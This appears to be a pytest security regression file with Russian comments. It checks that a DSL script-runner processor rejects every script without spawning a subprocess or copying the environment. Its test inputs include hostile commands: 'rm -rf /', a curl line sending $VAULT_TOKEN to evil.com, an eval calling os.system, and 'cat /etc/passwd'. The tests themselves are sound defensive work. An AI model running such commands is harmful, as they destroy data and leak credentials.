"""RCE-rejection tests для ScriptRunnerProcessor (cycle-6/D-AUDIT-602).

Эти тесты расположены в ``tests/unit/dsl/processors/`` (вне
``engine/processors/``), т.к. относятся к DSL security regression-pack
наряду с ``test_agent_security_check.py``. Проверяют, что malicious
payload НЕ доходит до subprocess: процессор всегда raise
:class:`NotImplementedError` и логирует RCE-warning.

Verify (per task T-C6-02-SCRIPT-RCE):
- malicious payload → reject (НЕ выполняется)
- subprocess НЕ создаётся
- env НЕ наследуется (нет os.environ.copy() вызова)
- tempfile НЕ создаётся
- interpreter path НЕ валидируется (subprocess никогда не стартует)
"""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from src.backend.dsl.engine.exchange import Exchange, Message
from src.backend.dsl.engine.processors.script_runner import ScriptRunnerProcessor


def _make_exchange() -> Exchange:
    """Создать пустой exchange для теста."""
    return Exchange(in_message=Message(body=None, headers={}))


class TestScriptRunnerRCERejection:
    """RCE-rejection tests (cycle-6/D-AUDIT-602)."""

    @pytest.mark.asyncio
    async def test_rm_rf_payload_rejected(self) -> None:
        """rm -rf payload → reject ДО выполнения."""
        proc = ScriptRunnerProcessor(
            language="python", code="import os; os.system('rm -rf /')",
        )
        exchange = _make_exchange()

        with (
            patch("asyncio.create_subprocess_exec") as mock_subproc,
            patch("tempfile.NamedTemporaryFile") as mock_tmp,
        ):
            with pytest.raises(NotImplementedError) as excinfo:
                await proc.process(exchange, MagicMock())

            assert "cycle-6/D-AUDIT-602" in str(excinfo.value)
            mock_subproc.assert_not_called()
            mock_tmp.assert_not_called()

    @pytest.mark.asyncio
    async def test_env_exfiltration_payload_rejected(self) -> None:
        """Env exfiltration payload (VAULT_TOKEN → curl) → reject."""
        proc = ScriptRunnerProcessor(
            language="shell",
            code="echo $VAULT_TOKEN | curl -X POST -d @- https://evil.com",
        )
        exchange = _make_exchange()

        with patch("asyncio.create_subprocess_exec") as mock_subproc:
            with pytest.raises(NotImplementedError):
                await proc.process(exchange, MagicMock())

            mock_subproc.assert_not_called()

    @pytest.mark.asyncio
    async def test_eval_exec_payload_rejected(self) -> None:
        """eval/exec payload → reject."""
        proc = ScriptRunnerProcessor(
            language="python", code="eval('__import__(\"os\").system(\"id\")')",
        )
        exchange = _make_exchange()

        with pytest.raises(NotImplementedError):
            await proc.process(exchange, MagicMock())

    @pytest.mark.asyncio
    async def test_interpreter_whitelisting_unnecessary(self) -> None:
        """Даже если interpreter указан явно — reject (нет subprocess)."""
        proc = ScriptRunnerProcessor(
            language="python",
            code="print('pwned')",
            interpreter="/usr/bin/python3",
            allowed_languages=["python"],
        )
        exchange = _make_exchange()

        with patch("asyncio.create_subprocess_exec") as mock_subproc:
            with pytest.raises(NotImplementedError):
                await proc.process(exchange, MagicMock())

            mock_subproc.assert_not_called()

    @pytest.mark.asyncio
    async def test_no_os_environ_leak(self) -> None:
        """os.environ.copy() НЕ вызывается (RCE-fix)."""
        proc = ScriptRunnerProcessor(language="python", code="import os")
        exchange = _make_exchange()

        with patch("os.environ.copy") as mock_env_copy:
            with pytest.raises(NotImplementedError):
                await proc.process(exchange, MagicMock())

            # os.environ.copy НЕ должен быть вызван — env не leak'ает.
            mock_env_copy.assert_not_called()

    @pytest.mark.asyncio
    async def test_rce_log_emitted_with_markers(self) -> None:
        """RCE-warning логируется с language и code_len markers."""
        code = "import os; os.system('cat /etc/passwd')" * 10
        proc = ScriptRunnerProcessor(language="python", code=code)
        exchange = _make_exchange()

        with patch(
            "src.backend.dsl.engine.processors.script_runner._logger",
        ) as mock_logger:
            with pytest.raises(NotImplementedError):
                await proc.process(exchange, MagicMock())

            mock_logger.error.assert_called_once()
            log_format = mock_logger.error.call_args[0][0]
            log_args = mock_logger.error.call_args[0][1:]
            assert "script_runner_disabled" in log_format
            assert "cycle-6/D-AUDIT-602" in log_format
            # args = (language, code_len, allowed)
            assert log_args[0] == "python"
            assert log_args[1] == len(code)
